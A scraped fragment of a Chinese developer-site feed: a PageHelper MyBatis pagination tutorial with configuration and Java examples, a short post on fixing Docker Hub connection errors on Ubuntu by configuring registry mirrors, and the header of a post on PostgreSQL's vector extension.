.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>PageHelper 详解</strong></h2>
<h3 data-id="heading-1"><strong>一、PageHelper 是什么？</strong></h3>
<p>PageHelper 是一个 MyBatis 的<strong>物理分页插件</strong>，它通过拦截 MyBatis 的 SQL 执行过程，自动为 SQL 添加分页语句，让开发者无需手动编写分页 SQL。</p>
<h4 data-id="heading-2"><strong>主要作用：</strong></h4>
<ol>
<li><strong>自动分页</strong> - 拦截查询 SQL，自动添加分页语句</li>
<li><strong>简化代码</strong> - 减少重复的分页逻辑编写</li>
<li><strong>统一管理</strong> - 提供统一的分页数据返回格式</li>
<li><strong>多数据库支持</strong> - 自动适配不同数据库的分页语法</li>
</ol>
<hr/>
<h3 data-id="heading-3"><strong>二、快速使用示例</strong></h3>
<h4 data-id="heading-4"><strong>基础使用：</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. 设置分页参数（第2页，每页10条）</span>
PageHelper.startPage(<span class="hljs-number">2</span>, <span class="hljs-number">10</span>);

<span class="hljs-comment">// 2. 执行查询（会自动分页）</span>
List&lt;User&gt; userList = userMapper.selectAll();

<span class="hljs-comment">// 3. 获取分页信息</span>
PageInfo&lt;User&gt; pageInfo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageInfo</span>&lt;&gt;(userList);

<span class="hljs-comment">// 使用分页数据</span>
System.out.println(<span class="hljs-string">"当前页："</span> + pageInfo.getPageNum());        <span class="hljs-comment">// 2</span>
System.out.println(<span class="hljs-string">"每页条数："</span> + pageInfo.getPageSize());     <span class="hljs-comment">// 10</span>
System.out.println(<span class="hljs-string">"总记录数："</span> + pageInfo.getTotal());        <span class="hljs-comment">// 总数据量</span>
System.out.println(<span class="hljs-string">"总页数："</span> + pageInfo.getPages());          <span class="hljs-comment">// 总页数</span>
System.out.println(<span class="hljs-string">"当前页数据："</span> + pageInfo.getList());       <span class="hljs-comment">// 当前页的数据</span>
</code></pre>
<hr/>
<h3 data-id="heading-5"><strong>三、完整配置指南</strong></h3>
<h4 data-id="heading-6"><strong>1. Maven 依赖</strong></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Spring Boot 项目 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.pagehelper<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>pagehelper-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.4.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 非 Spring Boot 项目 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.pagehelper<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>pagehelper<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.3.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h4 data-id="heading-7"><strong>2. Spring Boot 配置（application.yml）</strong></h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">pagehelper:</span>
  <span class="hljs-comment"># 数据库方言（自动检测可设为 auto）</span>
  <span class="hljs-attr">helper-dialect:</span> <span class="hljs-string">mysql</span>
  <span class="hljs-comment"># 分页合理化：pageNum&lt;=0 查询第一页，pageNum&gt;总页数查询最后一页</span>
  <span class="hljs-attr">reasonable:</span> <span class="hljs-literal">true</span>
  <span class="hljs-comment"># 支持通过 Mapper 接口参数传递分页参数</span>
  <span class="hljs-attr">support-methods-arguments:</span> <span class="hljs-literal">true</span>
  <span class="hljs-comment"># 默认值为 false，设为 true 时，RowBounds 第一个参数 offset 当成 pageNum 使用</span>
  <span class="hljs-attr">offset-as-page-num:</span> <span class="hljs-literal">true</span>
  <span class="hljs-comment"># 分页参数合理化</span>
  <span class="hljs-attr">page-size-zero:</span> <span class="hljs-literal">false</span>
  <span class="hljs-comment"># 默认为 false，设为 true 允许 pageSize=0 查询全部结果</span>
  <span class="hljs-attr">params:</span> <span class="hljs-string">count=countSql</span>
</code></pre>
<hr/>
<h3 data-id="heading-8"><strong>四、多种使用方式</strong></h3>
<h4 data-id="heading-9"><strong>方式1：基本分页查询</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> PageInfo&lt;User&gt; <span class="hljs-title function_">findUsers</span><span class="hljs-params">(<span class="hljs-type">int</span> pageNum, <span class="hljs-type">int</span> pageSize)</span> {
    <span class="hljs-comment">// 开始分页</span>
    PageHelper.startPage(pageNum, pageSize);
    
    <span class="hljs-comment">// 查询数据（自动分页）</span>
    List&lt;User&gt; list = userMapper.selectByExample(<span class="hljs-literal">null</span>);
    
    <span class="hljs-comment">// 包装分页结果</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageInfo</span>&lt;&gt;(list);
}
</code></pre>
<h4 data-id="heading-10"><strong>方式2：带条件的分页查询</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> PageInfo&lt;User&gt; <span class="hljs-title function_">findUsersByCondition</span><span class="hljs-params">(UserQuery query, <span class="hljs-type">int</span> pageNum, <span class="hljs-type">int</span> pageSize)</span> {
    PageHelper.startPage(pageNum, pageSize);
    
    <span class="hljs-type">Example</span> <span class="hljs-variable">example</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(User.class);
    <span class="hljs-keyword">if</span> (StringUtils.isNotBlank(query.getName())) {
        example.createCriteria().andLike(<span class="hljs-string">"name"</span>, <span class="hljs-string">"%"</span> + query.getName() + <span class="hljs-string">"%"</span>);
    }
    
    List&lt;User&gt; list = userMapper.selectByExample(example);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageInfo</span>&lt;&gt;(list);
}
</code></pre>
<h4 data-id="heading-11"><strong>方式3：返回 Page 对象</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> Page&lt;User&gt; <span class="hljs-title function_">findUsersPage</span><span class="hljs-params">(<span class="hljs-type">int</span> pageNum, <span class="hljs-type">int</span> pageSize)</span> {
    PageHelper.startPage(pageNum, pageSize);
    
    <span class="hljs-comment">// Page 是 ArrayList 的子类，自带分页信息</span>
    Page&lt;User&gt; page = (Page&lt;User&gt;) userMapper.selectAll();
    
    <span class="hljs-comment">// 可以直接获取分页信息</span>
    System.out.println(<span class="hljs-string">"总数："</span> + page.getTotal());
    <span class="hljs-keyword">return</span> page;
}
</code></pre>
<h4 data-id="heading-12"><strong>方式4：使用 RowBounds（不推荐）</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 不侵入代码的方式</span>
<span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">findUsersWithRowBounds</span><span class="hljs-params">(<span class="hljs-type">int</span> pageNum, <span class="hljs-type">int</span> pageSize)</span> {
    <span class="hljs-type">RowBounds</span> <span class="hljs-variable">rowBounds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RowBounds</span>((pageNum-<span class="hljs-number">1</span>)*pageSize, pageSize);
    <span class="hljs-keyword">return</span> userMapper.selectByRowBounds(<span class="hljs-literal">null</span>, rowBounds);
}
</code></pre>
<hr/>
<h3 data-id="heading-13"><strong>五、PageInfo 常用属性</strong></h3>

































































<table><thead><tr><th>属性</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>getList()</code></td><td>当前页数据列表</td><td><code>List&lt;T&gt;</code></td></tr><tr><td><code>getTotal()</code></td><td>总记录数</td><td>100</td></tr><tr><td><code>getPages()</code></td><td>总页数</td><td>10</td></tr><tr><td><code>getPageNum()</code></td><td>当前页码</td><td>1</td></tr><tr><td><code>getPageSize()</code></td><td>每页数量</td><td>10</td></tr><tr><td><code>isFirstPage()</code></td><td>是否第一页</td><td>true</td></tr><tr><td><code>isLastPage()</code></td><td>是否最后一页</td><td>false</td></tr><tr><td><code>isHasNextPage()</code></td><td>是否有下一页</td><td>true</td></tr><tr><td><code>isHasPreviousPage()</code></td><td>是否有上一页</td><td>false</td></tr><tr><td><code>getNavigatePages()</code></td><td>导航页码数</td><td>8</td></tr><tr><td><code>getNavigatepageNums()</code></td><td>导航页码数组</td><td>[1,2,3,4,5,6,7,8]</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-14"><strong>六、进阶用法</strong></h3>
<h4 data-id="heading-15"><strong>1. 排序功能</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 方式1：使用参数排序</span>
PageHelper.startPage(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-string">"create_time desc"</span>);

<span class="hljs-comment">// 方式2：使用 OrderBy 方法</span>
PageHelper.startPage(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)
         .setOrderBy(<span class="hljs-string">"age asc, name desc"</span>);

List&lt;User&gt; list = userMapper.selectAll();
</code></pre>
<h4 data-id="heading-16"><strong>2. 只统计数量不分页</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 只进行 count 查询</span>
PageHelper.startPage(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">// pageSize=0 时只查询总数</span>
<span class="hljs-type">long</span> <span class="hljs-variable">total</span> <span class="hljs-operator">=</span> ((Page&lt;?&gt;) userMapper.selectAll()).getTotal();
</code></pre>
<h4 data-id="heading-17"><strong>3. 分页拦截器设置参数</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 可以在代码中动态设置参数</span>
PageHelper.startPage(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)
    .setCount(<span class="hljs-literal">true</span>)           <span class="hljs-comment">// 是否进行 count 查询</span>
    .setReasonable(<span class="hljs-literal">false</span>)     <span class="hljs-comment">// 关闭合理化</span>
    .setPageSizeZero(<span class="hljs-literal">true</span>);   <span class="hljs-comment">// 允许 pageSize=0</span>
</code></pre>
<hr/>
<h3 data-id="heading-18"><strong>七、常见问题解决方案</strong></h3>
<h4 data-id="heading-19"><strong>问题1：分页不生效</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ❌ 错误写法：中间有其他查询</span>
PageHelper.startPage(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>);
userMapper.countAll();  <span class="hljs-comment">// 这个查询会被分页</span>
List&lt;User&gt; list = userMapper.selectAll();  <span class="hljs-comment">// 这个不会分页</span>

<span class="hljs-comment">// ✅ 正确写法：紧邻查询语句</span>
PageHelper.startPage(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>);
List&lt;User&gt; list = userMapper.selectAll();  <span class="hljs-comment">// 这个会分页</span>
</code></pre>
<h4 data-id="heading-20"><strong>问题2：自定义 count 查询</strong></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 在 Mapper.xml 中定义 count 查询 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"selectComplexCount"</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">"long"</span>&gt;</span>
    SELECT COUNT(*) FROM user WHERE status = 1
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 使用自定义 count 查询</span>
PageHelper.startPage(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)
    .setCountId(<span class="hljs-string">"selectComplexCount"</span>);
</code></pre>
<h4 data-id="heading-21"><strong>问题3：多表关联查询分页</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 对于复杂查询，可以在 SQL 中使用 PageHelper</span>
PageHelper.startPage(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>);
<span class="hljs-comment">// 自己写 JOIN 查询的 SQL</span>
List&lt;UserDTO&gt; list = userMapper.selectUserWithRole();
</code></pre>
<hr/>
<h3 data-id="heading-22"><strong>八、与 MyBatis-Plus 对比</strong></h3>



































<table><thead><tr><th>特性</th><th>PageHelper</th><th>MyBatis-Plus</th></tr></thead><tbody><tr><td><strong>侵入性</strong></td><td>无侵入</td><td>需要继承 BaseMapper</td></tr><tr><td><strong>使用方式</strong></td><td>ThreadLocal</td><td>传入 Page 对象</td></tr><tr><td><strong>功能范围</strong></td><td>专注分页</td><td>全套 CRUD+分页</td></tr><tr><td><strong>学习成本</strong></td><td>低</td><td>中等</td></tr><tr><td><strong>灵活性</strong></td><td>高</td><td>中等</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-23"><strong>九、最佳实践建议</strong></h3>
<ol>
<li><strong>服务层封装</strong></li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PageUtils</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; PageResult&lt;T&gt; <span class="hljs-title function_">toPageResult</span><span class="hljs-params">(PageInfo&lt;T&gt; pageInfo)</span> {
        PageResult&lt;T&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageResult</span>&lt;&gt;();
        result.setData(pageInfo.getList());
        result.setTotal(pageInfo.getTotal());
        result.setPageNum(pageInfo.getPageNum());
        result.setPageSize(pageInfo.getPageSize());
        <span class="hljs-keyword">return</span> result;
    }
}
</code></pre>
<ol start="2">
<li><strong>统一返回格式</strong></li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PageResult</span>&lt;T&gt; {
    <span class="hljs-keyword">private</span> List&lt;T&gt; data;
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> total;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> pageNum;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> pageSize;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> pages;
}
</code></pre>
<ol start="3">
<li><strong>Controller 使用</strong></li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@GetMapping("/users")</span>
<span class="hljs-keyword">public</span> Result <span class="hljs-title function_">listUsers</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(defaultValue = "1")</span> <span class="hljs-type">int</span> pageNum,
                        <span class="hljs-meta">@RequestParam(defaultValue = "10")</span> <span class="hljs-type">int</span> pageSize)</span> {
    PageInfo&lt;User&gt; pageInfo = userService.findUsers(pageNum, pageSize);
    <span class="hljs-keyword">return</span> Result.success(PageUtils.toPageResult(pageInfo));
}
</code></pre>
<hr/>
<h3 data-id="heading-24"><strong>总结</strong></h3>
<p>PageHelper 是一个非常实用的 MyBatis 分页插件，通过简单的 <code>PageHelper.startPage()</code> 调用即可实现复杂的分页功能。使用时注意：</p>
<ol>
<li>确保 <code>startPage()</code> 紧邻查询语句</li>
<li>合理配置数据库方言</li>
<li>根据需求选择合适的返回类型（PageInfo 或 Page）</li>
<li>对于复杂查询考虑自定义 count 语句</li>
</ol>
<p>熟练掌握 PageHelper 可以极大提升开发效率和代码可维护性。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Ubuntu系统docker错误，failed to do request: Head "https://registry-1.docker.io/v2/...]]></title>    <link>https://juejin.cn/post/7595400254346936335</link>    <guid>https://juejin.cn/post/7595400254346936335</guid>    <pubDate>2026-01-15T09:03:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595400254346936335" data-draft-id="7595400254346788879" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Ubuntu系统docker错误，failed to do request: Head &quot;https://registry-1.docker.io/v2/..."/> <meta itemprop="keywords" content="Docker"/> <meta itemprop="datePublished" content="2026-01-15T09:03:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户9381691255360"/> <meta itemprop="url" content="https://juejin.cn/user/3485906645565271"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Ubuntu系统docker错误，failed to do request: Head "https://registry-1.docker.io/v2/...
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3485906645565271/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户9381691255360
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T09:03:27.000Z" title="Thu Jan 15 2026 09:03:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>我的Ubuntu系统的版本是<strong>24.04.3 LTS</strong>‌（代号Noble Numbat）。<br/>
今天通过参考官网<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.docker.com%2Fengine%2Finstall%2Fubuntu%2F%23install-from-a-package" target="_blank" title="https://docs.docker.com/engine/install/ubuntu/#install-from-a-package" ref="nofollow noopener noreferrer">Install Docker Engine on Ubuntu</a>安装docker。在最后验证安装是否成功这一步是发生了错误。官网要求运行hello-world镜像<code>sudo docker run hello-world</code>。</p>
<pre><code class="hljs language-vbnet" lang="vbnet">ubuntu@VM-<span class="hljs-number">0</span>-<span class="hljs-number">11</span>-ubuntu:/var/docker-install$ sudo docker run hello-world
Unable <span class="hljs-keyword">to</span> find image <span class="hljs-comment">'hello-world:latest' locally</span>
<span class="hljs-symbol">docker:</span> <span class="hljs-keyword">Error</span> response <span class="hljs-keyword">from</span> daemon: failed <span class="hljs-keyword">to</span> resolve reference <span class="hljs-string">"docker.io/library/hello-world:latest"</span>: failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">do</span> request: Head <span class="hljs-string">"https://registry-1.docker.io/v2/library/hello-world/manifests/latest"</span>: dial tcp <span class="hljs-number">108.160</span>.<span class="hljs-number">170.44</span>:<span class="hljs-number">443</span>: connect: connection refused
</code></pre>
<p><strong>解决办法：配置Docker镜像源</strong></p>
<ol>
<li>修改docker配置文件。<br/>
打开终端，使用文本编辑器编辑Docker配置文件。</li>
</ol>

<pre><code class="hljs language-bash" lang="bash">sudo nano /etc/docker/daemon.json
</code></pre>
<p>将以下内容添加到配置文件中：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span> 
  <span class="hljs-attr">"registry-mirrors"</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span> 
    <span class="hljs-string">"https://docker.m.daocloud.io"</span><span class="hljs-punctuation">,</span> 
    <span class="hljs-string">"https://docker-cf.registry.cyou"</span> 
  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> 
  <span class="hljs-attr">"insecure-registries"</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span> 
    <span class="hljs-string">"docker.mirrors.ustc.edu.cn"</span> 
  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> 
  <span class="hljs-attr">"debug"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> 
  <span class="hljs-attr">"experimental"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span> 
<span class="hljs-punctuation">}</span>
</code></pre>
<p>保存并退出文件。
2. 重启docker服务。
执行以下命令重启docker服务。</p>
<pre><code class="hljs">sudo systemctl restart docker
</code></pre>
<p>3.  验证配置
通过以下命令验证配置是否生效。</p>

<pre><code class="hljs">sudo docker info
</code></pre>
<p>确保 <code>Registry Mirrors</code> 显示你配置的镜像源。</p>
<ol start="4">
<li>运行hello-world镜像。<br/>
执行命令<code>sudo docker run hello-world</code></li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f620deef22b471fa0f65312f07efeaa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3OTM4MTY5MTI1NTM2MA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769072606&amp;x-signature=DtgK2gMeOX5Xu1MmSQQRQPtqVYc%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Windows 在 PostgreSQL 上安装 vector 扩展]]></title>    <link>https://juejin.cn/post/7595131879266598966</link>    <guid>https://juejin.cn/post/7595131879266598966</guid>    <pubDate>2026-01-15T09:33:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595131879266598966" data-draft-id="7595167566144733203" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Windows 在 PostgreSQL 上安装 vector 扩展"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-15T09:33:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Assby"/> <meta itemprop="url" content="https://juejin.cn/user/2496307079162410"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Windows 在 PostgreSQL 上安装 vector 扩展
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2496307079162410/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Assby
